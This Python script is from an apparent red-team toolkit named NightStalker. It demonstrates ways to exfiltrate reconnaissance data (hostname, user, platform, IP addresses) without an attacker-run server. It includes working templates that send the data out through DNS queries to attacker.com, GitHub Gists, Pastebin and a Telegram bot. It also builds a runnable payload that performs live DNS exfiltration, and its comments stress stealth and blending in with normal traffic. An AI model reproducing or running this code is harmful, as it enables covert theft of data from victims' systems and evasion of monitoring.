#!/usr/bin/env python3
"""
NightStalker No-Server Exfiltration Examples
Demonstrates exfiltration without needing a home server
"""

import sys
import os
import json
import base64
import time
import socket
import platform
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'nightstalker'))

from redteam.payload_builder import PayloadBuilder

def gather_system_data():
    """Gather system reconnaissance data"""
    return {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'user': os.getenv('USERNAME', os.getenv('USER', 'Unknown')),
        'timestamp': time.time(),
        'ip_addresses': [addr[4][0] for addr in socket.getaddrinfo(socket.gethostname(), None)]
    }

def method1_dns_exfiltration():
    """Method 1: DNS Exfiltration (No server needed)"""
    print("🔍 Method 1: DNS Exfiltration")
    print("=" * 40)
    
    data = gather_system_data()
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    
    # Split into DNS-friendly chunks
    chunk_size = 50
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    print(f"📊 Data to exfiltrate: {len(encoded)} characters")
    print(f"📦 Split into {len(chunks)} DNS chunks")
    
    # Simulate DNS queries
    domain = "attacker.com"  # Replace with your domain
    for i, chunk in enumerate(chunks):
        query = f"{chunk}.{domain}"
        print(f"🌐 DNS Query {i+1}: {query[:60]}...")
        # In real scenario: socket.gethostbyname(query)
        time.sleep(0.1)  # Rate limiting
    
    print("✅ DNS exfiltration simulation completed")
    return chunks

def method2_github_gist():
    """Method 2: GitHub Gist (Looks like normal development)"""
    print("\n🔍 Method 2: GitHub Gist Exfiltration")
    print("=" * 40)
    
    data = gather_system_data()
    
    # This would require a GitHub token and gist ID
    print("📝 To use GitHub Gist exfiltration:")
    print("1. Create a GitHub personal access token")
    print("2. Create a private gist")
    print("3. Update the gist with your data")
    
    gist_code = '''
import requests
import json
import base64

def exfil_to_gist(data, gist_id, token):
    """Exfiltrate data to GitHub Gist"""
    encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
    
    headers = {
        'Authorization': f'token {token}',
        'Content-Type': 'application/json'
    }
    
    payload = {
        'files': {
            'data.txt': {'content': encoded_data}
        }
    }
    
    response = requests.patch(
        f'https://api.github.com/gists/{gist_id}',
        headers=headers,
        json=payload
    )
    
    return response.status_code == 200

# Usage:
# exfil_to_gist(system_data, 'your-gist-id', 'your-token')
'''
    
    print("📋 GitHub Gist code template:")
    print(gist_code)
    return gist_code

def method3_pastebin():
    """Method 3: Pastebin (Appears as normal data sharing)"""
    print("\n🔍 Method 3: Pastebin Exfiltration")
    print("=" * 40)
    
    data = gather_system_data()
    
    pastebin_code = '''
import requests
import json

def exfil_to_pastebin(data, api_key):
    """Exfiltrate data to Pastebin"""
    payload = {
        'api_dev_key': api_key,
        'api_option': 'paste',
        'api_paste_code': json.dumps(data),
        'api_paste_name': 'system_info',
        'api_paste_format': 'json',
        'api_paste_private': '1'  # Unlisted
    }
    
    response = requests.post('https://pastebin.com/api/api_post.php', data=payload)
    
    if response.status_code == 200:
        return response.text  # Returns paste URL
    return None

# Usage:
# paste_url = exfil_to_pastebin(system_data, 'your-api-key')
'''
    
    print("📋 Pastebin code template:")
    print(pastebin_code)
    return pastebin_code

def method4_telegram_bot():
    """Method 4: Telegram Bot (Very stealth)"""
    print("\n🔍 Method 4: Telegram Bot Exfiltration")
    print("=" * 40)
    
    data = gather_system_data()
    
    telegram_code = '''
import requests
import json
import base64

def telegram_exfil(data, bot_token, chat_id):
    """Exfiltrate data via Telegram bot"""
    encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': encoded_data
    }
    
    response = requests.post(url, json=payload)
    return response.status_code == 200

# Usage:
# telegram_exfil(system_data, 'your-bot-token', 'your-chat-id')
'''
    
    print("📋 Telegram Bot code template:")
    print(telegram_code)
    return telegram_code

def create_no_server_payload():
    """Create a payload that uses no-server exfiltration methods"""
    print("\n🔧 Creating No-Server Exfiltration Payload")
    print("=" * 40)
    
    builder = PayloadBuilder()
    
    # Create payload with multiple exfiltration methods
    no_server_code = '''
import os
import json
import socket
import platform
import time
import base64

def gather_system_info():
    """Gather system information"""
    return {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'user': os.getenv('USERNAME', os.getenv('USER', 'Unknown')),
        'timestamp': time.time(),
        'ip_addresses': [addr[4][0] for addr in socket.getaddrinfo(socket.gethostname(), None)]
    }

def dns_exfil(data, domain="attacker.com"):
    """DNS exfiltration (no server needed)"""
    try:
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        chunk_size = 50
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            query = f"{chunk}.{domain}"
            socket.gethostbyname(query)
            time.sleep(1)  # Rate limiting
        
        print("✅ DNS exfiltration completed")
        return True
    except Exception as e:
        print(f"❌ DNS exfiltration failed: {e}")
        return False

def github_gist_exfil(data, gist_id, token):
    """GitHub Gist exfiltration"""
    try:
        import requests
        encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
        
        headers = {
            'Authorization': f'token {token}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'files': {
                'data.txt': {'content': encoded_data}
            }
        }
        
        response = requests.patch(
            f'https://api.github.com/gists/{gist_id}',
            headers=headers,
            json=payload
        )
        
        if response.status_code == 200:
            print("✅ GitHub Gist exfiltration completed")
            return True
        else:
            print(f"❌ GitHub Gist exfiltration failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ GitHub Gist exfiltration failed: {e}")
        return False

def main():
    """Main exfiltration function"""
    print("🌙 NightStalker No-Server Exfiltration")
    print("=" * 40)
    
    # Gather system data
    system_data = gather_system_info()
    print(f"📊 Gathered {len(json.dumps(system_data))} bytes of system data")
    
    # Try DNS exfiltration first (no credentials needed)
    print("\\n🌐 Attempting DNS exfiltration...")
    dns_success = dns_exfil(system_data)
    
    # Try GitHub Gist if you have credentials
    # Uncomment and configure if you have GitHub token and gist ID
    # print("\\n📝 Attempting GitHub Gist exfiltration...")
    # gist_success = github_gist_exfil(system_data, 'your-gist-id', 'your-token')
    
    print("\\n✨ Exfiltration payload completed")

if __name__ == "__main__":
    main()
'''
    
    # Build the payload
    output_path = builder.build_payload(
        payload_type="no_server_exfil",
        payload_code=no_server_code,
        output_format="python",
        metadata={'description': 'No-server exfiltration payload using DNS and GitHub Gist'}
    )
    
    print(f"✅ No-server exfiltration payload created: {output_path}")
    return output_path

def main():
    """Demonstrate all no-server exfiltration methods"""
    print("🌙 NightStalker No-Server Exfiltration Methods")
    print("=" * 50)
    
    # Demonstrate each method
    method1_dns_exfiltration()
    method2_github_gist()
    method3_pastebin()
    method4_telegram_bot()
    
    # Create a practical payload
    payload_path = create_no_server_payload()
    
    print(f"\n🎯 To run the no-server exfiltration payload:")
    print(f"   python {payload_path}")
    
    print("\n📋 Summary of No-Server Methods:")
    print("1. DNS Exfiltration: No server, very stealthy, limited data size")
    print("2. GitHub Gist: Looks normal, requires token, good for larger data")
    print("3. Pastebin: Appears normal, requires API key, good for sharing")
    print("4. Telegram Bot: Very stealthy, encrypted, requires bot setup")
    
    print("\n✨ No-server exfiltration demonstration completed!")

if __name__ == "__main__":
    main() 